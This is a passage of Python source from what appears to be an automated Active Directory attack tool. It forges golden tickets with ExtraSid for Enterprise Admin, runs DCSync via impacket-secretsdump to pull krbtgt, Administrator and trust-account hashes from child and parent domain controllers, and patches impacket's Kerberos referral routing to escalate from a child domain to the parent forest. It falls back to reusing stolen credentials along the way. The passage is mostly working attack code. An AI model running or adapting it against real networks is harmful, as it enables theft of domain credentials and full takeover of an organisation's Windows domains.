                                # validation (host may not have is_dc yet)
                                child_dc_ip_check = state.domain_controllers.get(domain.lower())
                                if child_dc_ip_check and cached_dc_ip != child_dc_ip_check:
                                    parent_dc_ip = cached_dc_ip
                                    logger.info(
                                        f"🎫 Auto-golden-ticket: Using cached DC {cached_dc_ip} "
                                        f"for {parent_domain} (different from child DC {child_dc_ip_check})"
                                    )
                                else:
                                    logger.warning(
                                        f"🎫 Auto-golden-ticket: Cached DC {cached_dc_ip} for {parent_domain} "
                                        f"is not a valid parent DC (may be child DC), searching for correct DC"
                                    )

                        if not parent_dc_ip:
                            # Try to find parent DC from hosts by hostname
                            for host in state.all_hosts:
                                if (
                                    host.is_dc
                                    and host.hostname
                                    and host.hostname.lower().endswith(f".{parent_domain}")
                                    and not host.hostname.lower().endswith(f".{domain.lower()}")
                                ):
                                    parent_dc_ip = host.ip
                                    logger.info(
                                        f"🎫 Auto-golden-ticket: Found parent DC via hostname: "
                                        f"{host.hostname} -> {parent_dc_ip}"
                                    )
                                    break

                        # DNS fallback - resolve parent DC via SRV lookup
                        if not parent_dc_ip:
                            logger.info(
                                f"🎫 Auto-golden-ticket: Parent DC not in state, "
                                f"trying DNS resolution for {parent_domain}"
                            )
                            try:
                                import subprocess

                                # Use dig to query SRV record for LDAP service
                                dns_cmd = [
                                    "dig",
                                    "+short",
                                    f"_ldap._tcp.dc._msdcs.{parent_domain}",
                                    "SRV",
                                ]
                                result = subprocess.run(  # noqa: ASYNC221
                                    dns_cmd,
                                    capture_output=True,
                                    text=True,
                                    timeout=10,
                                    check=False,
                                )
                                if result.returncode == 0 and result.stdout.strip():
                                    # SRV format: priority weight port target
                                    # e.g., "0 100 389 dc.contoso.local."
                                    for line in result.stdout.strip().split("\n"):
                                        parts = line.split()
                                        if len(parts) >= 4:
                                            dc_hostname = parts[3].rstrip(".")
                                            # Resolve hostname to IP
                                            a_cmd = ["dig", "+short", dc_hostname, "A"]
                                            a_result = subprocess.run(  # noqa: ASYNC221
                                                a_cmd,
                                                capture_output=True,
                                                text=True,
                                                timeout=10,
                                                check=False,
                                            )
                                            if a_result.returncode == 0 and a_result.stdout.strip():
                                                parent_dc_ip = a_result.stdout.strip().split("\n")[
                                                    0
                                                ]
                                                logger.info(
                                                    f"🎫 Auto-golden-ticket: Resolved parent DC via DNS: "
                                                    f"{dc_hostname} -> {parent_dc_ip}"
                                                )
                                                # Cache for future use (don't persist - transient)
                                                state.domain_controllers[parent_domain] = (
                                                    parent_dc_ip
                                                )
                                                break
                            except Exception as dns_err:
                                logger.warning(
                                    f"🎫 Auto-golden-ticket: DNS resolution failed for parent: {dns_err}"
                                )

                        # Check domain_sids cache first (populated by inject-domain-sid CLI
                        # or secretsdump extraction) — avoids lookupsid which often fails in GOAD
                        cached_parent_sid = state.domain_sids.get(parent_domain.lower())
                        if cached_parent_sid:
                            parent_sid = cached_parent_sid
                            logger.info(
                                f"🎫 Auto-golden-ticket: Using cached parent SID {parent_sid} "
                                f"for {parent_domain} (from domain_sids cache)"
                            )
                        elif parent_dc_ip:
                            # Fall back to lookupsid on parent DC
                            logger.info(
                                f"🎫 Auto-golden-ticket: No cached SID for {parent_domain}, "
                                f"running lookupsid on {parent_dc_ip}"
                            )
                            if cred:
                                parent_cmd = [
                                    "impacket-lookupsid",
                                    f"{cred.domain}/{cred.username}:{cred.password}@{parent_dc_ip}",
                                ]
                            else:
                                assert auth_hash is not None  # noqa: S101
                                nt_hash = auth_hash.hash_value
                                if ":" in nt_hash:
                                    nt_hash = nt_hash.split(":")[-1]
                                parent_cmd = [
                                    "impacket-lookupsid",
                                    f"{auth_hash.domain}/{auth_hash.username}@{parent_dc_ip}",
                                    "-hashes",
                                    f":{nt_hash}",
                                ]
                            try:
                                parent_stdout, parent_stderr, _ = await _run_lookupsid_with_retry(
                                    parent_cmd, timeout_seconds=60
                                )
                                parent_output = parent_stdout + "\n" + (parent_stderr or "")
                                parent_sid_match = re.search(
                                    r"Domain SID is:\s*(S-\d+-\d+-\d+-\d+-\d+-\d+)", parent_output
                                )
                                if parent_sid_match:
                                    parent_sid = parent_sid_match.group(1)
                                    state.domain_sids[parent_domain.lower()] = parent_sid
                                    logger.info(
                                        f"🎫 Auto-golden-ticket: Got parent SID {parent_sid} "
                                        f"for {parent_domain}"
                                    )
                                else:
                                    parent_preview = parent_output[:300].replace("\n", "\\n")
                                    logger.warning(
                                        f"🎫 Auto-golden-ticket: lookupsid returned no SID for "
                                        f"{parent_domain}, trying LDAP fallback. "
                                        f"Output: {parent_preview}"
                                    )
                                    # LDAP fallback for parent SID
                                    try:
                                        parent_sid = await _get_domain_sid_via_ldap(
                                            parent_dc_ip, parent_domain, cred, auth_hash
                                        )
                                        if parent_sid:
                                            state.domain_sids[parent_domain.lower()] = parent_sid
                                            logger.info(
                                                f"🎫 Auto-golden-ticket: Got parent SID via LDAP: "
                                                f"{parent_sid}"
                                            )
                                        else:
                                            logger.warning(
                                                f"🎫 Auto-golden-ticket: LDAP also returned no "
                                                f"SID for {parent_domain}"
                                            )
                                    except Exception as ldap_err:
                                        logger.warning(
                                            f"🎫 Auto-golden-ticket: Parent LDAP fallback "
                                            f"failed: {ldap_err}"
                                        )
                            except Exception as e:
                                logger.warning(
                                    f"🎫 Auto-golden-ticket: Failed to get parent SID: {e}"
                                )

                    # Generate golden ticket
                    # Prefer AES256 key over NTLM hash for modern Windows (2016+)
                    # RC4 golden tickets fail with KDC_ERR_TGT_REVOKED on newer DCs
                    # Use domain-specific path to avoid overwriting tickets from other domains
                    domain_label = domain.replace(".", "_")
                    ticket_path = f"/tmp/Administrator_{domain_label}.ccache"  # nosec B108 # noqa: S108

                    if hash_obj.aes_key:
                        # Use AES256 key (required for Windows 2016+)
                        logger.info(
                            f"🎫 Auto-golden-ticket: Using AES256 key for {domain} "
                            f"(required for modern Windows)"
                        )
                        cmd = [
                            "impacket-ticketer",
                            "-aesKey",
                            hash_obj.aes_key,
                            "-domain-sid",
                            domain_sid,
                            "-domain",
                            domain,
                            "-user-id",
                            "500",
                            "Administrator",
                        ]
                    else:
                        # Fallback to NTLM hash (may fail on Windows 2016+)
                        krbtgt_nt_hash = hash_obj.hash_value
                        if ":" in krbtgt_nt_hash:
                            krbtgt_nt_hash = krbtgt_nt_hash.split(":")[-1]
                        logger.warning(
                            f"🎫 Auto-golden-ticket: No AES key available for {domain}, "
                            f"using NTLM hash (may fail on Windows 2016+)"
                        )
                        cmd = [
                            "impacket-ticketer",
                            "-nthash",
                            krbtgt_nt_hash,
                            "-domain-sid",
                            domain_sid,
                            "-domain",
                            domain,
                            "-user-id",
                            "500",
                            "Administrator",
                        ]

                    # Add ExtraSid for parent domain Enterprise Admin if we have parent SID
                    # This enables child-to-parent escalation via SID history injection
                    if parent_sid:
                        enterprise_admin_sid = f"{parent_sid}-519"
                        cmd.insert(-1, "-extra-sid")  # Insert before "Administrator"
                        cmd.insert(-1, enterprise_admin_sid)
                        logger.warning(
                            f"🎫 Auto-golden-ticket: Adding ExtraSid for Enterprise Admin!\n"
                            f"   Child: {domain} (SID: {domain_sid})\n"
                            f"   Parent: {parent_domain} (SID: {parent_sid})\n"
                            f"   ExtraSid: {enterprise_admin_sid}"
                        )
                    # Impacket cross-realm referral is broken (fortra/impacket#315)
                    # so ExtraSid golden ticket can't DCSync parent directly.
                    # Two-step workaround:
                    #   Step 1: ticketer + DCSync CHILD for parent trust key
                    #           (same realm → no referral → works)
                    #   Step 2: forge inter-realm TGT with trust key → DCSync
                    #           PARENT for {Admin, krbtgt, foreign trust keys}
                    #           (direct presentation → no referral → works)
                    #
                    # Each step combines ticketer + secretsdump in one run_tool
                    # call for ccache worker pod affinity.
                    if parent_sid and parent_dc_ip:
                        # In child domains, dc_ip and parent_dc_ip are
                        # often SWAPPED because the child DC's hostname
                        # is in the parent DNS zone (e.g., ws01
                        # registered as ws01.contoso.local
                        # but is actually the DC for child.contoso.local).
                        # DNS SRV won't help (no dig on orchestrator).
                        #
                        # Robust approach: collect all candidate DC IPs
                        # and try each one. Wrong DC fails fast (realm
                        # mismatch), correct one succeeds. The || in
                        # bash chains the attempts.

                        # Collect unique DC candidate IPs with hostnames
                        dc_candidates = []
                        seen_ips = set()
                        for cand_ip in [dc_ip, parent_dc_ip]:
                            if cand_ip and cand_ip not in seen_ips:
                                seen_ips.add(cand_ip)
                                short = None
                                for h in state.all_hosts:
                                    if h.ip == cand_ip and h.hostname:
                                        short = h.hostname.split(".")[0]
                                        break
                                dc_candidates.append((cand_ip, short))

                        # Parent trust account in child domain
                        # parent_domain is guaranteed non-None here (guarded by if parent_domain)
                        parent_netbios = parent_domain.split(".")[0].upper()  # type: ignore[union-attr]
                        trust_account = f"{parent_netbios}$"

                        # Foreign forests to extract from parent later
                        undominated = state.get_undominated_forests()

                        # Build ticketer command string
                        ticketer_str = " ".join(cmd)

                        # Step 1: golden ticket + child DCSync for trust
                        # key. Try each candidate DC — the one serving
                        # the child domain will succeed, others fail
                        # with KDC_ERR_WRONG_REALM.
                        # NOTE: impacket returns exit code 0 even on
                        # Kerberos errors, so || won't work. Run ALL
                        # candidates with ; (all run regardless). The
                        # trust hash regex matches the successful one.
                        attempts = []
                        for cand_ip, cand_short in dc_candidates:
                            fqdn = f"{cand_short}.{domain}" if cand_short else domain
                            attempts.append(
                                f"echo 'CANDIDATE_DC={cand_ip}' && "
                                f"KRB5CCNAME=Administrator.ccache "
                                f"impacket-secretsdump -k -no-pass "
                                f"-just-dc-user '{trust_account}' "
                                f"-target-ip {cand_ip} "
                                f"-dc-ip {cand_ip} "
                                f"'{domain}/Administrator@{fqdn}'"
                                f" 2>&1"
                            )
                        secretsdump_chain = "; ".join(attempts)
                        step1_bash = f"{ticketer_str} && {{ {secretsdump_chain}; }}"

                        logger.debug(f"🎫 Step 1 bash: {step1_bash}")

                        cand_desc = ", ".join(f"{s or '?'}/{ip}" for ip, s in dc_candidates)
                        logger.info(
                            f"🎫 Step 1/2: ExtraSid golden ticket + "
                            f"extract {trust_account} from {domain}\n"
                            f"   DC candidates: {cand_desc}"
                        )

                        step1_cmd = ["bash", "-c", step1_bash]
                        stdout, stderr, returncode = await _async_run_tool(
                            step1_cmd, timeout_seconds=600
                        )
                        output = stdout + "\n" + (stderr or "")

                        # Also resolve parent DC target for Step 2
                        # (use first candidate that ISN'T the child DC)
                        parent_dc_target = parent_dc_ip
                        for h in state.all_hosts:
                            if h.ip == parent_dc_ip and h.hostname:
                                parent_dc_target = h.hostname
                                break
                    else:
                        # No parent DC or no parent SID — just run ticketer.
                        # cmd already includes ExtraSid if parent_sid was set.
                        stdout, stderr, returncode = await _async_run_tool(cmd, timeout_seconds=300)
                        output = stdout + "\n" + (stderr or "")

                    if returncode == 0 or "Saving ticket" in output:
                        # Look up actual DC FQDN from discovered hosts
                        dc_fqdn = None
                        for host in state.all_hosts:
                            if host.ip == dc_ip and host.hostname and "." in host.hostname:
                                dc_fqdn = host.hostname
                                break
                        dc_target = dc_fqdn or dc_ip

                        if parent_sid:
                            _pdc_log = (
                                parent_dc_target if parent_dc_ip else parent_dc_ip or "parent-dc"
                            )
                            logger.success(
                                f"🎫 GOLDEN TICKET WITH EXTRASID GENERATED!\n"
                                f"→ Child domain: {domain}\n"
                                f"→ Parent domain: {parent_domain} "
                                f"(ENTERPRISE ADMIN ACCESS)\n"
                                f"→ Ticket saved as {ticket_path}\n"
                                f"→ Use: export KRB5CCNAME={ticket_path}\n"
                                f"→ DCSync parent: secretsdump.py -k "
                                f"-no-pass {_pdc_log}"
                            )
                        else:
                            logger.success(
                                f"🎫 GOLDEN TICKET GENERATED for {domain}!\n"
                                f"→ Ticket saved as {ticket_path}\n"
                                f"→ Use: export KRB5CCNAME={ticket_path}\n"
                                f"→ Then: psexec.py -k -no-pass "
                                f"-target-ip {dc_ip} {dc_target}"
                            )

                        # Announce golden ticket
                        await dispatcher.announce_golden_ticket(
                            domain=domain,
                            krbtgt_hash=hash_obj.hash_value,
                            ticket_path=ticket_path,
                            source_agent="auto_golden_ticket",
                            target_domain=parent_domain if parent_sid else None,
                        )

                        # If ExtraSid, mark parent as dominated and
                        # extract trust keys via 2-step approach.
                        if parent_sid and parent_domain:
                            if parent_domain.lower() not in [
                                d.lower() for d in state.domain_admin_domains
                            ]:
                                state.domain_admin_domains.append(parent_domain)
                                logger.info(
                                    f"🎫 Enterprise Admin achieved on "
                                    f"parent domain: {parent_domain}"
                                )

                            # Parse child→parent trust key from step 1
                            if parent_dc_ip:
                                try:
                                    from ares.core.models import Hash

                                    trust_hash_match = re.search(
                                        rf"{re.escape(trust_account)}"
                                        rf":\d+:"
                                        rf"[a-fA-F0-9]{{32}}:"
                                        rf"([a-fA-F0-9]{{32}})",
                                        output,
                                    )
                                    trust_aes_match = re.search(
                                        rf"{re.escape(trust_account)}:"
                                        rf"aes256-cts-hmac-sha1-96:"
                                        rf"([a-fA-F0-9]+)",
                                        output,
                                    )

                                    if not trust_hash_match:
                                        # Golden ticket DCSync failed
                                        # (likely KDC_ERR_TGT_REVOKED
                                        # due to PAC validation).
                                        # Fallback: use DA credentials
                                        # for direct DCSync.
                                        re.findall(
                                            r"CANDIDATE_DC=(\S+)",
                                            output,
                                        )
                                        logger.warning(
                                            f"🎫 Step 1 golden ticket "
                                            f"DCSync failed, trying "
                                            f"credential fallback for "
                                            f"{trust_account}"
                                        )
                                        # Find DA cred for child domain
                                        _fb_cred = None
                                        _fb_hash = None
                                        for c in state.all_credentials:
                                            if (
                                                c.domain
                                                and c.domain.lower() == domain.lower()
                                                and c.is_admin
                                            ):
                                                _fb_cred = c
                                                break
                                        if not _fb_cred:
                                            for c in state.all_credentials:
                                                if (
                                                    c.domain
                                                    and c.domain.lower() == domain.lower()
                                                    and c.password
                                                ):
                                                    _fb_cred = c
                                                    break
                                        if not _fb_cred:
                                            for h in state.all_hashes:
                                                if (
                                                    h.domain
                                                    and h.domain.lower() == domain.lower()
                                                    and h.username.lower() != "krbtgt"
                                                    and h.hash_type.upper() == "NTLM"
                                                ):
                                                    _fb_hash = h
                                                    break
                                        child_nb = domain.split(".")[0].upper()
                                        if _fb_cred and _fb_cred.password:
                                            _fb_cmd = [
                                                "impacket-secretsdump",
                                                f"{domain}/{_fb_cred.username}:{_fb_cred.password}@{dc_ip}",
                                                "-just-dc-user",
                                                f"{child_nb}/{trust_account}",
                                            ]
                                            logger.info(
                                                f"🎫 Step 1 fallback: "
                                                f"credential DCSync "
                                                f"{trust_account} via "
                                                f"{_fb_cred.username}"
                                            )
                                        elif _fb_hash:
                                            _nt = _fb_hash.hash_value
                                            if ":" in _nt:
                                                _nt = _nt.split(":")[-1]
                                            _fb_cmd = [
                                                "impacket-secretsdump",
                                                f"{domain}/{_fb_hash.username}@{dc_ip}",
                                                "-hashes",
                                                f"aad3b435b51404eeaad3b435b51404ee:{_nt}",
                                                "-just-dc-user",
                                                f"{child_nb}/{trust_account}",
                                            ]
                                            logger.info(
                                                f"🎫 Step 1 fallback: "
                                                f"hash DCSync "
                                                f"{trust_account} via "
                                                f"{_fb_hash.username}"
                                            )
                                        else:
                                            _fb_cmd = None
                                            logger.warning(
                                                f"🎫 Step 1 fallback: no credentials for {domain}"
                                            )
                                        if _fb_cmd:
                                            _fb_out, _fb_err, _fb_rc = await _async_run_tool(
                                                _fb_cmd,
                                                timeout_seconds=180,
                                            )
                                            _fb_output = (_fb_out or "") + "\n" + (_fb_err or "")
                                            trust_hash_match = re.search(
                                                rf"{re.escape(trust_account)}"
                                                rf":\d+:"
                                                rf"([a-fA-F0-9]+:"
                                                rf"[a-fA-F0-9]+)",
                                                _fb_output,
                                            )
                                            trust_aes_match = re.search(
                                                rf"{re.escape(trust_account)}"
                                                rf":aes256-cts-hmac-sha1-96:"
                                                rf"([a-fA-F0-9]+)",
                                                _fb_output,
                                            )
                                            if trust_hash_match:
                                                output = _fb_output
                                                logger.success(
                                                    f"🎫 Step 1 fallback "
                                                    f"succeeded for "
                                                    f"{trust_account}"
                                                )
                                            else:
                                                logger.warning(
                                                    f"🎫 Step 1 fallback "
                                                    f"also failed: "
                                                    f"{_fb_output[-400:]}"
                                                )
                                    if not trust_hash_match:
                                        logger.warning(
                                            f"🎫 Step 1 completely failed for {trust_account}"
                                        )
                                    else:
                                        trust_nt_hash = trust_hash_match.group(1)
                                        trust_aes_key = (
                                            trust_aes_match.group(1) if trust_aes_match else ""
                                        )
                                        logger.success(
                                            f"🎫 Got child→parent trust "
                                            f"key: {trust_account} "
                                            f"(NTLM: "
                                            f"{trust_nt_hash[:8]}..., "
                                            f"AES: "
                                            f"{'yes' if trust_aes_key else 'no'})"
                                        )

                                        # Store trust key
                                        state.add_hash(
                                            Hash(
                                                username=trust_account,
                                                domain=domain,
                                                hash_type="NTLM",
                                                hash_value=trust_nt_hash,
                                                aes_key=trust_aes_key,
                                                source="auto_golden_ticket:child_dcsync",
                                            ),
                                            "auto_golden_ticket",
                                        )

                                        # === Step 2: DCSync parent via
                                        # referral routing ===
                                        # Reuse the SAME ExtraSid golden
                                        # ticket and monkey-patch impacket's
                                        # sendReceive() to fix cross-realm
                                        # referral routing (#315).
                                        #
                                        # Flow:
                                        # 1. Re-forge ExtraSid golden ticket
                                        # 2. secretsdump targets parent DC
                                        # 3. Kerberos TGS-REQ → child DC
                                        # 4. Child DC issues referral TGT
                                        # 5. Patched sendReceive routes
                                        #    referral to parent DC
                                        # 6. Parent issues service ticket
                                        # 7. DCSync succeeds

                                        # Build parent DCSync targets
                                        # Prefix with parent NetBIOS
                                        # domain to avoid
                                        # ERROR_DS_NAME_ERROR_NOT_UNIQUE
                                        # (Administrator/krbtgt exist in
                                        # both child and parent domains)
                                        parent_nb = parent_domain.split(".")[0].upper()
                                        parent_targets = [
                                            f"{parent_nb}\\Administrator",
                                            f"{parent_nb}\\krbtgt",
                                        ]
                                        for fd in undominated:
                                            fn = fd.split(".")[0].upper()
                                            parent_targets.append(f"{fn}$")

                                        import shlex

                                        # Sync hosts from Redis before
                                        # DC resolution — injected hosts
                                        # may have updated FQDNs
                                        try:
                                            redis_hosts = await backend.get_hosts()
                                            for rh in redis_hosts:
                                                state.add_host(rh)
                                            logger.info(
                                                f"🎫 Step 2: synced "
                                                f"{len(redis_hosts)} "
                                                f"hosts from Redis"
                                            )
                                        except Exception as _hsync:
                                            logger.warning(f"🎫 Step 2: host sync failed: {_hsync}")

                                        # Resolve which candidate DC serves
                                        # which domain using CANDIDATE_DC
                                        # markers from Step 1 output.
                                        # The candidate whose output
                                        # contains the trust hash is the
                                        # child DC; the other is parent.
                                        child_dc_step2 = None
                                        parent_dc_step2 = None
                                        parent_fqdn_step2 = None

                                        # Parse CANDIDATE_DC markers:
                                        # split output by marker to find
                                        # which candidate produced the
                                        # trust hash
                                        cand_ips = [ip for ip, _ in dc_candidates]
                                        marker_sections = re.split(
                                            r"CANDIDATE_DC=(\S+)",
                                            output,
                                        )
                                        # marker_sections is:
                                        # [pre, ip1, text1, ip2, text2, ...]
                                        for idx in range(1, len(marker_sections), 2):
                                            m_ip = marker_sections[idx]
                                            m_text = (
                                                marker_sections[idx + 1]
                                                if idx + 1 < len(marker_sections)
                                                else ""
                                            )
                                            if trust_nt_hash in m_text:
                                                child_dc_step2 = m_ip
                                                break

                                        if child_dc_step2:
                                            # Parent is the OTHER candidate
                                            for cip in cand_ips:
                                                if cip != child_dc_step2:
                                                    parent_dc_step2 = cip
                                                    break
                                            if not parent_dc_step2:
                                                # Only one candidate — use
                                                # parent_dc_ip as fallback
                                                parent_dc_step2 = parent_dc_ip
                                            logger.info(
                                                f"🎫 Step 2 DC resolution "
                                                f"(from markers): child="
                                                f"{child_dc_step2}, "
                                                f"parent="
                                                f"{parent_dc_step2}"
                                            )
                                        else:
                                            # Marker approach failed —
                                            # fall back to hostname-based
                                            logger.warning(
                                                "🎫 Step 2: CANDIDATE_DC "
                                                "markers didn't resolve, "
                                                "trying hostnames"
                                            )
                                            dc_host_map = {
                                                h.ip: h.hostname
                                                for h in state.all_hosts
                                                if h.hostname
                                            }
                                            logger.info(
                                                f"🎫 Step 2 DC fallback: "
                                                f"candidates="
                                                f"{dc_candidates}, "
                                                f"host_map="
                                                f"{dc_host_map}"
                                            )
                                            for (
                                                cand_ip,
                                                _cs,
                                            ) in dc_candidates:
                                                for h in state.all_hosts:
                                                    if (
                                                        h.ip == cand_ip
                                                        and h.hostname
                                                        and "." in h.hostname
                                                    ):
                                                        hd = h.hostname.split(".", 1)[1].lower()
                                                        if hd == domain.lower():
                                                            child_dc_step2 = cand_ip
                                                        elif hd == parent_domain.lower():
                                                            parent_dc_step2 = cand_ip
                                                            parent_fqdn_step2 = h.hostname
                                                        break

                                        if not child_dc_step2 or not parent_dc_step2:
                                            logger.warning(
                                                "🎫 Step 2: Could not "
                                                "resolve child/parent DC, "
                                                "using dc_ip/parent_dc_ip"
                                            )
                                            child_dc_step2 = child_dc_step2 or dc_ip
                                            parent_dc_step2 = parent_dc_step2 or parent_dc_ip

                                        # Resolve parent FQDN for
                                        # secretsdump target
                                        if not parent_fqdn_step2:
                                            for h in state.all_hosts:
                                                if h.ip == parent_dc_step2 and h.hostname:
                                                    parent_fqdn_step2 = h.hostname
                                                    break
                                        if not parent_fqdn_step2:
                                            parent_fqdn_step2 = parent_domain
                                        targets_str = ",".join(parent_targets)

                                        # Python script that:
                                        # 1. Patches sendReceive to route
                                        #    referrals to correct parent DC
                                        #    (fixes fortra/impacket#315)
                                        # 2. Runs secretsdump in-process
                                        #    for each target user
                                        dcsync_py = (
                                            "import os,sys,re,"
                                            "runpy,shutil\n"
                                            "from impacket.krb5"
                                            " import kerberosv5\n"
                                            "_oSR=kerberosv5"
                                            ".sendReceive\n"
                                            f'CD="{domain.upper()}"\n'
                                            f"PD="
                                            f'"{parent_domain.upper()}"\n'
                                            f"CDC="
                                            f'"{child_dc_step2}"\n'
                                            f"PDC="
                                            f'"{parent_dc_step2}"\n'
                                            f"PF="
                                            f'"{parent_fqdn_step2}"\n'
                                            "DKM={CD:CDC,PD:PDC}\n"
                                            "def _pSR(d,dom,kdc=None):\n"
                                            "  m=DKM.get(dom.upper())\n"
                                            "  if m:\n"
                                            "    try:\n"
                                            "      return _oSR(d,dom,m)\n"
                                            "    except Exception as e1:\n"
                                            "      print(f'KDC {m} failed"
                                            " for {dom}: {e1}')\n"
                                            "      for a in"
                                            " set(DKM.values()):\n"
                                            "        if a!=m:\n"
                                            "          try:"
                                            "return _oSR(d,dom,a)\n"
                                            "          except:pass\n"
                                            "      raise\n"
                                            "  return _oSR(d,dom,kdc)\n"
                                            "kerberosv5.sendReceive"
                                            "=_pSR\n"
                                            "os.environ['KRB5CCNAME']="
                                            "'Administrator.ccache'\n"
                                            "w=shutil.which("
                                            "'impacket-secretsdump')\n"
                                            "sd=None\n"
                                            "if w:\n"
                                            "  with open(w) as f:\n"
                                            "    c=f.read()\n"
                                            '  m=re.search(r\'"([^"]*'
                                            "secretsdump\\.py)\"',c)\n"
                                            "  if m:sd=m.group(1)\n"
                                            "  elif c.startswith("
                                            "'#!/usr/bin/env python'):\n"
                                            "    sd=w\n"
                                            "if not sd:\n"
                                            "  sd='/opt/impacket/"
                                            "examples/secretsdump.py'\n"
                                            "print(f'using {sd}')\n"
                                            f'TARGETS="{targets_str}"\n'
                                            "for usr in"
                                            " TARGETS.split(','):\n"
                                            "  try:\n"
                                            "    sys.argv=["
                                            "'secretsdump','-k',"
                                            "'-no-pass','-just-dc-user'"
                                            ",usr,'-just-dc-ntlm',"
                                            "'-target-ip',PDC,"
                                            "'-dc-ip',CDC,"
                                            "CD+'/Administrator@'"
                                            "+PF]\n"
                                            "    print("
                                            "f'DCSync {usr} via {PF}')\n"
                                            "    runpy.run_path(sd,"
                                            "run_name='__main__')\n"
                                            "  except SystemExit:pass\n"
                                            "  except Exception as e:\n"
                                            "    print("
                                            "f'DCSync {usr}: {e}')\n"
                                        )
                                        dcsync_cmd = f"python3 -c {shlex.quote(dcsync_py)}"

                                        # Reuse Step 1 golden ticket
                                        step2_bash = f"{ticketer_str} && {dcsync_cmd}"

                                        logger.info(
                                            f"🎫 Step 2/2: Parent DCSync "
                                            f"via referral routing\n"
                                            f"   Targets: "
                                            f"{', '.join(parent_targets)}"
                                            f"\n   Child DC: "
                                            f"{child_dc_step2}"
                                            f"\n   Parent DC: "
                                            f"{parent_fqdn_step2} "
                                            f"({parent_dc_step2})"
                                        )

                                        step2_cmd = [
                                            "bash",
                                            "-c",
                                            step2_bash,
                                        ]
                                        (
                                            s2_stdout,
                                            s2_stderr,
                                            _s2_rc,
                                        ) = await _async_run_tool(
                                            step2_cmd,
                                            timeout_seconds=600,
                                        )
                                        parent_output = s2_stdout + "\n" + (s2_stderr or "")

                                        # Parse Administrator
                                        admin_m = re.search(
                                            r"Administrator:\d+:"
                                            r"[a-fA-F0-9]{32}:"
                                            r"([a-fA-F0-9]{32})",
                                            parent_output,
                                        )
                                        if admin_m:
                                            logger.success(
                                                f"🎫 Got parent Admin: "
                                                f"{parent_domain}"
                                                f"\\Administrator"
                                            )
                                            state.add_hash(
                                                Hash(
                                                    username="Administrator",
                                                    domain=parent_domain,
                                                    hash_type="NTLM",
                                                    hash_value=admin_m.group(1),
                                                    source="auto_golden_ticket:parent_dcsync",
                                                ),
                                                "auto_golden_ticket",
                                            )
                                            state.has_domain_admin = True
                                            if parent_domain.lower() not in [
                                                d.lower() for d in (state.domain_admin_domains)
                                            ]:
                                                state.domain_admin_domains.append(
                                                    parent_domain.lower()
                                                )
                                        else:
                                            logger.warning(
                                                "🎫 Step 2: golden ticket "
                                                "parent DCSync failed, "
                                                "trying credential "
                                                "fallback"
                                            )
                                            # Credential fallback for
                                            # parent DCSync — find any
                                            # parent DA cred and use it
                                            _p_cred = None
                                            for c in state.all_credentials:
                                                if (
                                                    c.domain
                                                    and c.domain.lower() == parent_domain.lower()
                                                    and c.password
                                                ):
                                                    _p_cred = c
                                                    break
                                            if _p_cred:
                                                parent_nb = parent_domain.split(".")[0].upper()
                                                _p_targets = [
                                                    f"{parent_nb}\\Administrator",
                                                    f"{parent_nb}\\krbtgt",
                                                ]
                                                # Refresh undominated list
                                                _fb_undom = (
                                                    state.get_undominated_forests() or undominated
                                                )
                                                for fd in _fb_undom:
                                                    fn = fd.split(".")[0].upper()
                                                    _p_targets.append(f"{fn}$")
                                                _all_p_out = ""
                                                logger.info(
                                                    f"🎫 Step 2 fallback: "
                                                    f"credential DCSync "
                                                    f"via {_p_cred.username}"
                                                    f"@{parent_domain}"
                                                    f" targets: "
                                                    f"{_p_targets}"
                                                )
                                                _p_dc = parent_dc_step2 or parent_dc_ip
                                                for _pt in _p_targets:
                                                    _p_cmd = [
                                                        "impacket-secretsdump",
                                                        f"{parent_domain}/"
                                                        f"{_p_cred.username}:"
                                                        f"{_p_cred.password}"
                                                        f"@{_p_dc}",
                                                        "-just-dc-user",
                                                        _pt,
                                                    ]
                                                    (
                                                        _po,
                                                        _pe,
                                                        _prc,
                                                    ) = await _async_run_tool(
                                                        _p_cmd,
                                                        timeout_seconds=120,
                                                    )
                                                    _all_p_out += (
                                                        (_po or "") + "\n" + (_pe or "") + "\n"
                                                    )
                                                parent_output = _all_p_out
                                                admin_m = re.search(
                                                    r"Administrator:\d+:"
                                                    r"[a-fA-F0-9]{32}:"
                                                    r"([a-fA-F0-9]{32})",
                                                    parent_output,
                                                )
                                                if admin_m:
                                                    logger.success(
                                                        "🎫 Step 2 fallback got parent Admin"
                                                    )
                                                    state.add_hash(
                                                        Hash(
                                                            username="Administrator",
                                                            domain=parent_domain,
                                                            hash_type="NTLM",
                                                            hash_value=admin_m.group(1),
                                                            source="auto_golden_ticket:parent_dcsync_fallback",
                                                        ),
                                                        "auto_golden_ticket",
                                                    )
                                                    state.has_domain_admin = True
                                                    if parent_domain.lower() not in [
                                                        d.lower()
                                                        for d in state.domain_admin_domains
                                                    ]:
                                                        state.domain_admin_domains.append(
                                                            parent_domain.lower()
                                                        )
                                                    # Cache parent DC IP so
                                                    # trust dispatch can
                                                    # find it
                                                    state.domain_controllers[
                                                        parent_domain.lower()
                                                    ] = _p_dc
                                                else:
                                                    logger.warning(
                                                        f"🎫 Step 2 fallback "
                                                        f"also failed: "
                                                        f"{parent_output[-500:]}"
                                                    )
                                            else:
                                                logger.warning(
                                                    f"🎫 Step 2: no parent "
                                                    f"DA credentials for "
                                                    f"fallback DCSync of "
                                                    f"{parent_domain}"
                                                )

                                        # Parse krbtgt + AES
                                        krbtgt_m = re.search(
                                            r"krbtgt:\d+:"
                                            r"[a-fA-F0-9]{32}:"
                                            r"([a-fA-F0-9]{32})",
                                            parent_output,
                                        )
                                        krbtgt_aes_m = re.search(
                                            r"krbtgt:"
                                            r"aes256-cts-hmac-sha1-96:"
                                            r"([a-fA-F0-9]+)",
                                            parent_output,
                                        )
                                        if krbtgt_m:
                                            p_aes = krbtgt_aes_m.group(1) if krbtgt_aes_m else ""
                                            logger.success(
                                                f"🎫 Got parent krbtgt "
                                                f"(AES: "
                                                f"{'yes' if p_aes else 'no'})"
                                            )
                                            state.add_hash(
                                                Hash(
                                                    username="krbtgt",
                                                    domain=parent_domain,
                                                    hash_type="NTLM",
                                                    hash_value=krbtgt_m.group(1),
                                                    aes_key=p_aes,
                                                    source="auto_golden_ticket:parent_dcsync",
                                                ),
                                                "auto_golden_ticket",
                                            )

                                        # Parse foreign trust keys
                                        # (e.g., FABRIKAM$ from parent)
                                        for fd in undominated:
                                            fn = fd.split(".")[0].upper()
                                            ta = f"{fn}$"
                                            th = re.search(
                                                rf"{re.escape(ta)}"
                                                rf":\d+:"
                                                rf"[a-fA-F0-9]{{32}}:"
                                                rf"([a-fA-F0-9]{{32}})",
                                                parent_output,
